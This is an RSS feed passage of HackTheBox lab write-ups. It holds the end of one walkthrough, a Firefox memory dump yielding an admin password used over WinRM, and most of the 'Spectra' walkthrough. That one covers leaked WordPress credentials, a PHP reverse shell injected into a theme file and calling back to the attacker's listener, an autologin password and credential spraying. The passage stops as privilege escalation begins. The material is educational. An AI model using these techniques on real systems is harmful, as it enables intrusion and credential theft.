</span></span><span class="line"><span class="cl">-a----        7/12/2021  11:07 PM      <span class="m">547841456</span> firefox.exe_210712_230707.dmp
</span></span><span class="line"><span class="cl">-a----        7/12/2021  11:18 PM      <span class="m">136871696</span> foxdump.txt
</span></span></code></pre></div><p>Searching for a string &ldquo;password&rdquo; in the converted dump file reveals the password used by admin (<code>4dD!5}x/re8]FBuZ</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; gc foxdump.txt <span class="p">|</span> <span class="k">select</span>-string <span class="s2">&#34;password&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s2">&#34;C:\Program Files\Mozilla Firefox\firefox.exe&#34;</span> localhost/login.php?login_username<span class="o">=</span>admin@support.htb<span class="p">&amp;</span><span class="nv">login_password</span><span class="o">=</span>4dD!5<span class="o">}</span>x/re8<span class="o">]</span>FBuZ<span class="p">&amp;</span><span class="nv">login</span><span class="o">=</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p><strong>[Side note]</strong></p>
<p>If this was done by automation script, maybe I could try to drop a packet sniffer before dumping the whole process.</p>
<p><div class="img-container"><img src="imgs/image-20210726192951302.png" alt="image-20210726192951302"  /></div>
</p>
<h4 id="winrm---administrator">WinRM - Administrator</h4>
<p>The password <code>4dD!5}x/re8]FBuZ</code> works for administrator account.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.10.149 -u <span class="s1">&#39;Administrator&#39;</span> -p <span class="s1">&#39;4dD!5}x/re8]FBuZ&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; whoami<span class="p">;</span> hostname<span class="p">;</span> ipconfig<span class="p">;</span> <span class="nb">type</span> ..<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
</span></span><span class="line"><span class="cl">supportdesk<span class="se">\a</span>dministrator
</span></span><span class="line"><span class="cl">SupportDesk
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Windows IP Configuration
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ethernet adapter Ethernet0 2:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . :
</span></span><span class="line"><span class="cl">   IPv6 Address. . . . . . . . . . . : dead:beef::60f9:33ef:49c0:aa91
</span></span><span class="line"><span class="cl">   Link-local IPv6 Address . . . . . : fe80::60f9:33ef:49c0:aa91%15
</span></span><span class="line"><span class="cl">   IPv4 Address. . . . . . . . . . . : 10.10.10.149
</span></span><span class="line"><span class="cl">   Subnet Mask . . . . . . . . . . . : 255.255.255.0
</span></span><span class="line"><span class="cl">   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15
</span></span><span class="line"><span class="cl">                                       10.10.10.2
</span></span><span class="line"><span class="cl">50dfa...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Spectra</title>
      <link>https://fahmifj.github.io/hackthebox/spectra/</link>
      <pubDate>Sat, 26 Jun 2021 21:27:14 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/spectra/</guid>
      <description>Getting password from automatic login script of ChromeOS</description>
      <content:encoded><![CDATA[<p>Spectra is an easy machine from HackTheBox that runs a Chrome OS. It starts by enumerating a WordPress website, which has a directory listing enabled, thus exposing its source code. Examining the source reveals a database password that is reused by the wordpress admin. With administrator access, I&rsquo;m able to inject a PHP code into a theme file to get a foothold on the system. Enumerating the internal discovers an auto-login password, and it is reused by a user. The user has sudo permissions on <code>initctl</code>, which can be exploited to get a root shell.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>WordPress exploitation</li>
<li>Command injection</li>
<li>Sudo exploitation on initctl</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>CrackMapExec</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> full scan discovers three open ports: SSH on port 22, Nginx web server in port 80, and MySQL.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «spectra» «10.10.14.21» 
</span></span><span class="line"><span class="cl">$ nmap -p- -sV --reason -oA nmap/10-allport 10.10.10.229
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-15 10:10 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.229
</span></span><span class="line"><span class="cl">Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.052s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65532</span> closed ports
</span></span><span class="line"><span class="cl">Reason: <span class="m">65532</span> resets
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE REASON         VERSION
</span></span><span class="line"><span class="cl">22/tcp   open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 8.1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp   open  http    syn-ack ttl <span class="m">63</span> nginx 1.17.4
</span></span><span class="line"><span class="cl">3306/tcp open  mysql   syn-ack ttl <span class="m">63</span> MySQL <span class="o">(</span>unauthorized<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 123.14 seconds
</span></span></code></pre></div><p>MySQL service is normally tied to 127.0.0.1, but <code>nmap</code> already identified that I have no access there.</p>
<p>Running a script scan didn&rsquo;t find any interesting information.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---spectrahtb">TCP 80 - spectra.htb</h3>
<p>The site appears to be under development.</p>
<p><div class="img-container"><img src="imgs/image-20210515212024368.png" alt="image-20210515212024368"  /></div>
</p>
<p>Inspecting page source discovers a hostname and two directories:</p>
<ul>
<li><a href="http://spectra.htb/main/index.php">http://spectra.htb/main/index.php</a></li>
<li><a href="http://spectra.htb/testing/index.php">http://spectra.htb/testing/index.php</a></li>
</ul>
<p><div class="img-container"><img src="imgs/image-20210515212038877.png" alt="image-20210515212038877"  /></div>
</p>
<p>I&rsquo;ll update my <code>/etc/hosts</code> with the hostname.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «spectra» «10.10.14.21» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.229 spectra.htb&#39;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><p>Poking with <code>curl</code>, shows that with or without the hostname it&rsquo;s the same site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">→ root@kali «~» «10.10.14.9» 
</span></span><span class="line"><span class="cl">$ curl -s http://spectra.htb/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">283</span>
</span></span><span class="line"><span class="cl">→ root@kali «~» «10.10.14.9» 
</span></span><span class="line"><span class="cl">$ curl -s http://10.10.10.229 <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">283</span>
</span></span></code></pre></div><p>Clicking on &ldquo;<strong>Software Issue Tracker</strong>&rdquo;, redirects to a WordPress site and nothing interesting except one default post by administrator.</p>
<p><div class="img-container"><img src="imgs/image-20210626224157109.png" alt="image-20210626224157109"  /></div>
</p>
<p>Visiting &ldquo;<strong>Test</strong>&rdquo;, the site page shows an error message about database connection.</p>
<p><div class="img-container"><img src="imgs/image-20210515214125642.png" alt="image-20210515214125642"  /></div>
</p>
<p>Removing <code>index.php</code> from URL, reveals that this page has directory listing enabled.</p>
<p><div class="img-container"><img src="imgs/image-20210515221118144.png" alt="image-20210515221118144"  /></div>
</p>
<p>The  <code>wp-config.php.save</code> file draws my attention. It contains a set of database credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «spectra» «10.10.14.21» 
</span></span><span class="line"><span class="cl">$ curl http://spectra.htb/testing/wp-config.php.save
</span></span><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">define<span class="o">(</span> <span class="s1">&#39;DB_NAME&#39;</span>, <span class="s1">&#39;dev&#39;</span> <span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/** MySQL database username */
</span></span><span class="line"><span class="cl">define<span class="o">(</span> <span class="s1">&#39;DB_USER&#39;</span>, <span class="s1">&#39;devtest&#39;</span> <span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/** MySQL database password */
</span></span><span class="line"><span class="cl">define<span class="o">(</span> <span class="s1">&#39;DB_PASSWORD&#39;</span>, <span class="s1">&#39;devteam01&#39;</span> <span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/** MySQL hostname */
</span></span><span class="line"><span class="cl">define<span class="o">(</span> <span class="s1">&#39;DB_HOST&#39;</span>, <span class="s1">&#39;localhost&#39;</span> <span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-nginx">Shell as nginx</h3>
<h4 id="wp-admin-dashboard">WP-Admin Dashboard</h4>
<p>The database password works with administrator account (<code>administrator:devteam01</code>), it allows me to access the admin dashboard.</p>
<p><div class="img-container"><img src="imgs/image-20210626225944808.png" alt="image-20210626225944808"  /></div>
</p>
<h4 id="injecting-reverse-shell">Injecting Reverse Shell</h4>
<p>Armed with administrator access, I can inject a malicious PHP code into one of the available themes files and execute it by visiting the full URL of the theme file. In this case, I&rsquo;ll inject a <a href="https://github.com/pentestmonkey/php-reverse-shell">reverse shell</a> script in <code>404.php</code> file of the Twenty Nineteen theme. The file can be found at <strong>Appearance</strong> &gt; <strong>Theme Editor</strong>.</p>
<p><div class="img-container"><img src="imgs/image-20210515231108016.png" alt="image-20210515231108016"  /></div>
</p>
<p>I&rsquo;ll access this URL to get a shell: <code>http://spectra.htb/main/wp-content/themes/twentynineteen/404.php</code>, but it returns an error message pointing on line 12.</p>
<p><div class="img-container"><img src="imgs/image-20210515231346411.png" alt="image-20210515231346411"  /></div>
</p>
<p>I&rsquo;m able to resolve the error by commenting out the line 12.</p>
<p><div class="img-container"><img src="imgs/image-20210515231422348.png" alt="image-20210515231422348"  /></div>
</p>
<p>This time, I&rsquo;ll trigger the reverse shell using <code>curl</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «spectra» «10.10.14.21» 
</span></span><span class="line"><span class="cl">$ curl -s http://spectra.htb/main/wp-content/themes/twentynineteen/404.php
</span></span></code></pre></div><p>On my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «spectra» «10.10.14.21» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9001</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.21<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.229<span class="o">]</span> <span class="m">35166</span>
</span></span><span class="line"><span class="cl">Linux spectra 5.4.66+ <span class="c1">#1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7302P 16-Core Processor AuthenticAMD GNU/Linux</span>
</span></span><span class="line"><span class="cl"> 09:14:42 up 10:53,  <span class="m">0</span> users,  load average: 0.02, 0.04, 0.00
</span></span><span class="line"><span class="cl">USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>20155<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>20156<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>20156<span class="o">(</span>nginx<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ hostname
</span></span><span class="line"><span class="cl">spectra
</span></span></code></pre></div><h4 id="shell-upgrade">Shell upgrade</h4>
<p>My current shell doesn&rsquo;t have PATH variable set, so I have to use the full path to upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ which python3
</span></span><span class="line"><span class="cl">which: no python3 in <span class="o">((</span>null<span class="o">))</span>
</span></span><span class="line"><span class="cl">$ ls /usr/bin/ <span class="p">|</span> grep python 
</span></span><span class="line"><span class="cl">python
</span></span><span class="line"><span class="cl">python-config
</span></span><span class="line"><span class="cl">python-wrapper
</span></span><span class="line"><span class="cl">python2
</span></span><span class="line"><span class="cl">python2.7
</span></span><span class="line"><span class="cl">python3
</span></span><span class="line"><span class="cl">python3.6
</span></span><span class="line"><span class="cl">python3.6m
</span></span><span class="line"><span class="cl">$ /usr/bin/python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">nginx@spectra / $ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">nginx@spectra / $ ^Z
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">7285</span> suspended  nc -nvlp <span class="m">9001</span>
</span></span><span class="line"><span class="cl">→ root@kali «spectra» «10.10.14.21» 
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">7285</span> continued  nc -nvlp <span class="m">9001</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">nginx@spectra / $ 
</span></span></code></pre></div><p>To resolve the <code>((null))</code> message, I&rsquo;ll add <code>/usr/bin</code> to current PATH variable.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nginx@spectra / $ env
</span></span><span class="line"><span class="cl"><span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl"><span class="nv">USER</span><span class="o">=</span>nginx
</span></span><span class="line"><span class="cl"><span class="nv">PWD</span><span class="o">=</span>/
</span></span><span class="line"><span class="cl"><span class="nv">SHLVL</span><span class="o">=</span><span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="nv">HOME</span><span class="o">=</span>/home/nginx
</span></span><span class="line"><span class="cl"><span class="nv">_</span><span class="o">=</span>/usr/bin/env
</span></span><span class="line"><span class="cl">nginx@spectra / $ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/usr/bin 
</span></span><span class="line"><span class="cl">nginx@spectra / $ which python
</span></span><span class="line"><span class="cl">/usr/local/bin/python
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-katie">Shell as katie</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>There are 4 users with login shell in this machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nginx@spectra / $ cat /etc/passwd <span class="p">|</span> grep sh$  
</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
</span></span><span class="line"><span class="cl">chronos:x:1000:1000:system_user:/home/chronos/user:/bin/bash
</span></span><span class="line"><span class="cl">nginx:x:20155:20156::/home/nginx:/bin/bash
</span></span><span class="line"><span class="cl">katie:x:20156:20157::/home/katie:/bin/bash
</span></span></code></pre></div><p>Enumerating home directory shows the user flag is on  <code>katie</code>&rsquo;s home directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nginx@spectra / $ ls -lR /home 2&gt;/dev/null
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">/home/katie:
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> katie katie <span class="m">4096</span> Jan <span class="m">15</span> 15:55 log
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> katie katie   <span class="m">33</span> Feb  <span class="m">2</span> 15:57 user.txt
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>All the web files are located in <code>/usr/local/share/nginx/html/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nginx@spectra / $ find / -type f -name wp-config.php 2&gt;/dev/null
</span></span><span class="line"><span class="cl">/usr/local/share/nginx/html/main/wp-config.php
</span></span><span class="line"><span class="cl">/usr/local/share/nginx/html/testing/wp-config.php
</span></span><span class="line"><span class="cl">/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-config.php
</span></span><span class="line"><span class="cl">/mnt/stateful_partition/dev_image/share/nginx/html/testing/wp-config.php
</span></span></code></pre></div><p>The <code>wp-config.php</code> file for <code>/main</code> has different credentials with the one on <code>/testing</code>. I&rsquo;ll grab these credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nginx@spectra / $ cat /usr/local/share/nginx/html/main/wp-config.php
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">// ** MySQL settings - You can get this info from your web host ** //
</span></span><span class="line"><span class="cl">/** The name of the database <span class="k">for</span> WordPress */
</span></span><span class="line"><span class="cl">define<span class="o">(</span> <span class="s1">&#39;DB_NAME&#39;</span>, <span class="s1">&#39;dev&#39;</span> <span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/** MySQL database username */
</span></span><span class="line"><span class="cl">define<span class="o">(</span> <span class="s1">&#39;DB_USER&#39;</span>, <span class="s1">&#39;dev&#39;</span> <span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/** MySQL database password */
</span></span><span class="line"><span class="cl">define<span class="o">(</span> <span class="s1">&#39;DB_PASSWORD&#39;</span>, <span class="s1">&#39;development01&#39;</span> <span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>In <code>/opt</code>, there is a file with uncommon extension called <code>autologin.conf.orig</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nginx@spectra /opt $ cat autologin.conf.orig 
</span></span><span class="line"><span class="cl"><span class="c1"># Copyright 2016 The Chromium OS Authors. All rights reserved.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Use of this source code is governed by a BSD-style license that can be</span>
</span></span><span class="line"><span class="cl"><span class="c1"># found in the LICENSE file.</span>
</span></span><span class="line"><span class="cl">description   <span class="s2">&#34;Automatic login at boot&#34;</span>
</span></span><span class="line"><span class="cl">author        <span class="s2">&#34;chromium-os-dev@chromium.org&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># After boot-complete starts, the login prompt is visible and is accepting</span>
</span></span><span class="line"><span class="cl"><span class="c1"># input.</span>
</span></span><span class="line"><span class="cl">start on started boot-complete
</span></span><span class="line"><span class="cl">script
</span></span><span class="line"><span class="cl">  <span class="nv">passwd</span><span class="o">=</span>
</span></span><span class="line"><span class="cl">  <span class="c1"># Read password from file. The file may optionally end with a newline.</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> dir in /mnt/stateful_partition/etc/autologin /etc/autologin<span class="p">;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">[</span> -e <span class="s2">&#34;</span><span class="si">${</span><span class="nv">dir</span><span class="si">}</span><span class="s2">/passwd&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">      <span class="nv">passwd</span><span class="o">=</span><span class="s2">&#34;</span><span class="k">$(</span>cat <span class="s2">&#34;</span><span class="si">${</span><span class="nv">dir</span><span class="si">}</span><span class="s2">/passwd&#34;</span><span class="k">)</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="nb">break</span>
</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
</span></span><span class="line"><span class="cl">  <span class="k">done</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="o">[</span> -z <span class="s2">&#34;</span><span class="si">${</span><span class="nv">passwd</span><span class="si">}</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">  <span class="k">fi</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>Based on the comments, the file is an autologin script. It looks for <code>passwd</code> file in these directories:</p>
<ul>
<li><code>/mnt/stateful_partition/etc/autologin</code></li>
<li><code>/etc/autologin</code></li>
</ul>
<p>And the <code>passwd</code> file in <code>/etc/autologin/</code> directory contains a password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nginx@spectra /opt $ ls -l /etc/autologin/             
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">19</span> Feb  <span class="m">3</span> 16:43 passwd
</span></span><span class="line"><span class="cl">nginx@spectra /opt $ cat /etc/autologin/passwd 
</span></span><span class="line"><span class="cl">SummerHereWeCome!!
</span></span></code></pre></div><h4 id="ssh---katie">SSH - katie</h4>
<p>I&rsquo;ll spray <code>SummerHereWeCome!!</code> and <code>development01</code> using <code>crackmapexec</code> to the users who have login shell. Within a few sec, it returns that <code>katie:SummerHereWeCome!!</code> are the valid credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «spectra» «10.10.14.21» 
</span></span><span class="line"><span class="cl">$ crackmapexec ssh 10.10.10.229 -u users.list -p passwords.list
</span></span><span class="line"><span class="cl">SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_8.1
</span></span><span class="line"><span class="cl">SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>-<span class="o">]</span> chronos:devteam01 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>-<span class="o">]</span> chronos:development01 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>-<span class="o">]</span> chronos:SummerHereWeCome!! Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>-<span class="o">]</span> katie:devteam01 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>-<span class="o">]</span> katie:development01 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>+<span class="o">]</span> katie:SummerHereWeCome!!
</span></span></code></pre></div><p>I&rsquo;m able to login via SSH</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «spectra» «10.10.14.21» 
</span></span><span class="line"><span class="cl">$ ssh katie@10.10.10.229
</span></span><span class="line"><span class="cl">Password: 
</span></span><span class="line"><span class="cl">katie@spectra ~ $ id 
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>20156<span class="o">(</span>katie<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>20157<span class="o">(</span>katie<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>20157<span class="o">(</span>katie<span class="o">)</span>,20158<span class="o">(</span>developers<span class="o">)</span>
</span></span></code></pre></div><p>User flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">katie@spectra ~ $ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">36</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">5</span> katie katie <span class="m">4096</span> May <span class="m">15</span> 12:17 .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">8</span> root  root  <span class="m">4096</span> Feb  <span class="m">2</span> 15:55 ..
</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root  root     <span class="m">9</span> Feb  <span class="m">2</span> 15:55 .bash_history -&gt; /dev/null
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> katie katie  <span class="m">127</span> Dec <span class="m">22</span> 05:46 .bash_logout
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> katie katie  <span class="m">204</span> Dec <span class="m">22</span> 05:46 .bash_profile
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> katie katie  <span class="m">551</span> Dec <span class="m">22</span> 05:46 .bashrc
</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> katie katie <span class="m">4096</span> May <span class="m">15</span> 12:17 .gnupg
</span></span><span class="line"><span class="cl">drwx------ <span class="m">3</span> katie katie <span class="m">4096</span> Jan <span class="m">15</span> 15:55 .pki
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> katie katie <span class="m">4096</span> Jan <span class="m">15</span> 15:55 log
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> katie katie   <span class="m">33</span> Feb  <span class="m">2</span> 15:57 user.txt
</span></span></code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration-1">Internal Enumeration</h4>
<p>The first thing I will check if I have the user&rsquo;s password is the sudo rights, and this user has one on <a href="https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it"><code>initctl</code></a>. Unfortunately, <code>initctl</code> is not listed on GTFObins site, so I&rsquo;ll have to look around.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">katie@spectra ~ $ sudo -l
</span></span><span class="line"><span class="cl">User katie may run the following commands on spectra:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> SETENV: NOPASSWD: /sbin/initctl
</span></span></code></pre></div><p>Enumerating for files owned by developers discovers some writable <code>.conf</code> files and a JavaScript file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">katie@spectra ~ $ find / -type f -group developers -ls 2&gt;/dev/null
</span></span><span class="line"><span class="cl">    <span class="m">32121</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test6.conf
</span></span><span class="line"><span class="cl">    <span class="m">32123</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test7.conf
</span></span><span class="line"><span class="cl">    <span class="m">32109</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test3.conf
